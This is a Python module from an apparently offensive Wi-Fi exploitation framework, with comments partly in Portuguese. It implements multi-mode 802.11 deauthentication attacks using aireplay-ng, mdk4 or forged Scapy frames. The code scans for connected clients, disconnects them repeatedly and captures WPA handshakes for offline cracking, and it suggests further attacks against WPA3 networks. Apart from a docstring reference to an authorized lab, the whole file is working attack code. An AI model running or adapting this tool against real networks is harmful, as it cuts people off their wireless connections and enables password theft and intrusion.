#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Multi-mode deauthentication attack module.

Supports multiple deauth strategies in a single module:
  - targeted     Single client from specific AP (aireplay-ng style)
  - broadcast    All clients of a specific AP
  - multi_ap     Multiple APs simultaneously
  - channel_hop  Deauth across channels (mdk4 style)
  - pmf_aware    PMF/802.11w detection + SAE downgrade hint

All operations require an authorized lab environment with monitor-mode interface.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import time
from pathlib import Path
from typing import List, Optional

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab, warn_pmf_ios

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Multi-mode deauthentication with PMF awareness and tool selection."""

    __info__ = {
        "name": "Deauth Multi-Mode",
        "description": (
            "Multi-strategy deauthentication: targeted, broadcast, multi-AP, "
            "channel-hopping, and PMF-aware modes. Uses aireplay-ng, mdk4, or "
            "Scapy as backend. All modes require monitor-mode interface in "
            "authorized lab environment."
        ),
        "authors": ["André Henrique (@mrhenrike) | União Geek"],
        "references": [
            "https://www.aircrack-ng.org/doku.php?id=aireplay-ng",
            "https://github.com/aircrack-ng/mdk4",
        ],
        "devices": ("wifi",),
    }

    target_bssid = OptMAC("FF:FF:FF:FF:FF:FF", "Target AP BSSID (FF:...:FF for broadcast)")
    client_mac = OptMAC("FF:FF:FF:FF:FF:FF", "Target client MAC (FF:...:FF for all clients)")
    interface = OptString("wlan0mon", "Monitor-mode interface")
    mode = OptString(
        "targeted",
        "Attack mode: targeted | broadcast | multi_ap | channel_hop | pmf_aware",
    )
    backend = OptString("aireplay", "Backend tool: aireplay | mdk4 | scapy")
    count = OptInteger(0, "Number of deauth frames (0 = continuous)")
    delay = OptInteger(0, "Delay between bursts in ms")
    channel = OptString("", "Channel(s) — comma-separated for multi/hop modes")
    duration = OptInteger(30, "Duration in seconds (0 = until Ctrl+C)")
    capture_handshake = OptBool(True, "Attempt handshake capture during deauth")
    dry_run = OptBool(False, "Print command without executing")

    VALID_MODES = ("targeted", "broadcast", "multi_ap", "channel_hop", "pmf_aware")
    VALID_BACKENDS = ("aireplay", "mdk4", "scapy")

    def _check_pmf(self) -> bool:
        """Check if target AP advertises PMF (802.11w) via beacon analysis."""
        print_status("Checking PMF/802.11w status for {}...".format(self.target_bssid))
        try:
            result = subprocess.run(
                ["airodump-ng", "--bssid", self.target_bssid, "--write-interval", "1",
                 "-w", "/dev/null", self.interface],
                capture_output=True, text=True, timeout=5,
                encoding="utf-8", errors="replace",
            )
            if "WPA3" in result.stdout or "SAE" in result.stdout:
                print_info("PMF likely REQUIRED (WPA3/SAE detected). Standard deauth may fail.")
                print_info("Consider: SAE commit flood, transition-mode downgrade, or KARMA attack.")
                return True
        except Exception:
            pass
        return False

    def _set_channel(self) -> None:
        """Força o canal na interface antes do deauth."""
        ch = str(self.channel).split(",")[0].strip()
        if ch and ch.isdigit():
            try:
                subprocess.run(
                    ["sudo", "iw", "dev", self.interface, "set", "channel", ch],
                    capture_output=True, timeout=3,
                )
            except Exception:
                pass

    def _scan_clients(self) -> List[str]:
        """Faz airodump rápido (5s) para detectar clientes conectados ao AP.
        Retorna lista de MACs de clientes."""
        if not shutil.which("airodump-ng"):
            return []
        import tempfile
        import csv
        with tempfile.TemporaryDirectory() as tmpdir:
            out_prefix = f"{tmpdir}/scan"
            cmd = [
                "sudo", "airodump-ng",
                "--bssid", self.target_bssid,
                "-w", out_prefix,
                "--output-format", "csv",
                self.interface,
            ]
            if self.channel:
                ch = str(self.channel).split(",")[0].strip()
                if ch:
                    cmd += ["-c", ch]
            try:
                subprocess.run(cmd, timeout=5, capture_output=True, check=False)
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                return []
            csv_file = f"{out_prefix}-01.csv"
            clients: List[str] = []
            try:
                with open(csv_file, encoding="latin-1", errors="ignore") as f:
                    in_stations = False
                    for line in f:
                        if "Station MAC" in line:
                            in_stations = True
                            continue
                        if in_stations and line.strip():
                            parts = [p.strip() for p in line.split(",")]
                            if len(parts) >= 6 and parts[5].strip() == self.target_bssid:
                                clients.append(parts[0])
            except Exception:
                pass
        return clients

    def _build_aireplay_cmd(self) -> List[str]:
        """Build aireplay-ng deauth command com canal."""
        cmd = ["sudo", "aireplay-ng", "--deauth", str(self.count if self.count > 0 else 15)]
        if self.target_bssid != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-a", self.target_bssid])
        if self.client_mac != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-c", self.client_mac])
        cmd.append(self.interface)
        return cmd

    def _build_mdk4_cmd(self) -> List[str]:
        """Build mdk4 deauth command — mais eficiente que aireplay."""
        cmd = ["sudo", "mdk4", self.interface, "d"]
        if self.target_bssid != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-B", self.target_bssid])
        if self.client_mac != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-S", self.client_mac])
        ch = str(self.channel).split(",")[0].strip()
        if ch and ch.isdigit():
            cmd.extend(["-c", ch])
        return cmd

    def _run_targeted_deauth_with_capture(self) -> None:
        """Deauth targetado por cliente + airodump simultâneo para captura de handshake."""
        import threading
        import tempfile

        out_dir = tempfile.mkdtemp(prefix="wxf_deauth_")
        clients = self._scan_clients()

        if not clients:
            print_info("Nenhum cliente detectado via scan. Usando broadcast.")
        else:
            print_info("Clientes detectados: {}".format(clients))

        # Inicia airodump em thread separada
        cap_prefix = f"{out_dir}/hs"
        cap_cmd = ["sudo", "airodump-ng",
                   "--bssid", self.target_bssid,
                   "-w", cap_prefix,
                   "--output-format", "pcap",
                   self.interface]
        ch = str(self.channel).split(",")[0].strip()
        if ch and ch.isdigit():
            cap_cmd += ["-c", ch]

        cap_proc = None
        if shutil.which("airodump-ng"):
            cap_proc = subprocess.Popen(cap_cmd, stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL)
            print_info("airodump capturando em background...")
            time.sleep(2)  # aguardar airodump iniciar

        # Deauth por cliente (mais eficaz) ou broadcast
        deauth_targets = clients if clients else ["FF:FF:FF:FF:FF:FF"]
        duration = max(10, int(self.duration))
        end_time = time.time() + duration

        while time.time() < end_time:
            for client in deauth_targets:
                if self.backend == "mdk4" and shutil.which("mdk4"):
                    cmd = ["sudo", "mdk4", self.interface, "d",
                           "-B", self.target_bssid]
                    if client != "FF:FF:FF:FF:FF:FF":
                        cmd += ["-S", client]
                    if ch and ch.isdigit():
                        cmd += ["-c", ch]
                elif shutil.which("aireplay-ng"):
                    cmd = ["sudo", "aireplay-ng", "--deauth",
                           str(self.count if self.count > 0 else 10),
                           "-a", self.target_bssid,
                           self.interface]
                    if client != "FF:FF:FF:FF:FF:FF":
                        cmd += ["-c", client]
                else:
                    self._run_scapy_deauth()
                    break

                try:
                    subprocess.run(cmd, timeout=8, capture_output=True, check=False)
                    print_info("  Deauth → {} (client: {})".format(
                        self.target_bssid[:11], client[:11]))
                except subprocess.TimeoutExpired:
                    pass

                if self.delay:
                    time.sleep(self.delay / 1000.0)

            # Verificar se capturou handshake
            cap_file = cap_prefix + "-01.cap"
            if shutil.which("aircrack-ng") and Path(cap_file).exists():
                result = subprocess.run(
                    ["aircrack-ng", cap_file],
                    capture_output=True, text=True, timeout=5,
                )
                if "1 handshake" in result.stdout.lower():
                    print_success("HANDSHAKE CAPTURADO em: {}".format(cap_file))
                    break

        if cap_proc:
            cap_proc.terminate()
            print_info("Captura encerrada. Arquivo: {}-01.cap".format(cap_prefix))

    def _run_scapy_deauth(self) -> None:
        """Run deauth using Scapy directly (no external tools needed)."""
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
        except ImportError:
            print_error("Scapy not available for direct deauth.")
            return

        print_status("Scapy deauth: {} -> {} on {}".format(
            self.target_bssid, self.client_mac, self.interface))

        pkt_ap_to_client = (
            RadioTap() /
            Dot11(type=0, subtype=12, addr1=self.client_mac,
                  addr2=self.target_bssid, addr3=self.target_bssid) /
            Dot11Deauth(reason=7)
        )
        pkt_client_to_ap = (
            RadioTap() /
            Dot11(type=0, subtype=12, addr1=self.target_bssid,
                  addr2=self.client_mac, addr3=self.target_bssid) /
            Dot11Deauth(reason=7)
        )
        pkt_broadcast = (
            RadioTap() /
            Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",
                  addr2=self.target_bssid, addr3=self.target_bssid) /
            Dot11Deauth(reason=7)
        )

        packets = [pkt_ap_to_client, pkt_client_to_ap, pkt_broadcast]
        count = self.count if self.count > 0 else 999999
        end_time = time.time() + self.duration if self.duration > 0 else float("inf")

        sent = 0
        try:
            while sent < count and time.time() < end_time:
                for pkt in packets:
                    sendp(pkt, iface=self.interface, count=1, verbose=False)
                    sent += 1
                if self.delay:
                    time.sleep(self.delay / 1000.0)
        except KeyboardInterrupt:
            pass

        print_success("Sent {} deauth frames.".format(sent))

    def run(self) -> None:
        """Executa deauth com seleção inteligente de backend e captura de handshake."""
        if self.mode not in self.VALID_MODES:
            print_error("Modo inválido '{}'. Escolha: {}".format(
                self.mode, ", ".join(self.VALID_MODES)))
            return

        if self.mode == "pmf_aware":
            pmf = self._check_pmf()
            if pmf:
                print_info("PMF detectado. Usando mdk4 (mais eficaz contra PMF opcional).")
            self.mode = "broadcast"

        if bool(self.dry_run):
            if self.backend == "aireplay":
                cmd = self._build_aireplay_cmd()
            else:
                cmd = self._build_mdk4_cmd()
            print_info("DRY RUN: {}".format(" ".join(cmd)))
            return

        # Ajustar canal antes do ataque
        self._set_channel()

        # Modo com captura simultânea de handshake (mais eficaz)
        if bool(self.capture_handshake) and self.target_bssid != "FF:FF:FF:FF:FF:FF":
            print_status("Deauth + Handshake capture simultâneo (modo avançado)...")
            self._run_targeted_deauth_with_capture()
            return

        # Selecionar backend com fallback automático
        backend = str(self.backend)

        # Priorizar mdk4 (mais confiável que aireplay em WSL)
        if backend == "aireplay" and not shutil.which("aireplay-ng"):
            if shutil.which("mdk4"):
                print_info("aireplay-ng não encontrado. Usando mdk4.")
                backend = "mdk4"
            else:
                print_info("Nenhum backend externo. Usando Scapy.")
                backend = "scapy"

        if backend == "scapy":
            self._run_scapy_deauth()
            return

        if backend == "aireplay":
            cmd = self._build_aireplay_cmd()
        elif backend == "mdk4":
            cmd = self._build_mdk4_cmd()
        else:
            print_error("Backend desconhecido '{}'.".format(backend))
            return

        cmd_str = " ".join(cmd)
        print_status("Deauth {} (modo: {}, backend: {})...".format(
            self.target_bssid, self.mode, backend))
        print_info("Command: {}".format(cmd_str))

        timeout = int(self.duration) if int(self.duration) > 0 else None
        try:
            subprocess.run(cmd, timeout=timeout, check=False)
            print_success("Deauth concluído.")
        except subprocess.TimeoutExpired:
            print_info("Deauth: duração atingida ({:.0f}s).".format(self.duration))
        except KeyboardInterrupt:
            print_info("\nDeauth interrompido.")
        except Exception as err:
            print_error("Deauth falhou: {}. Tentando Scapy...".format(err))
            self._run_scapy_deauth()
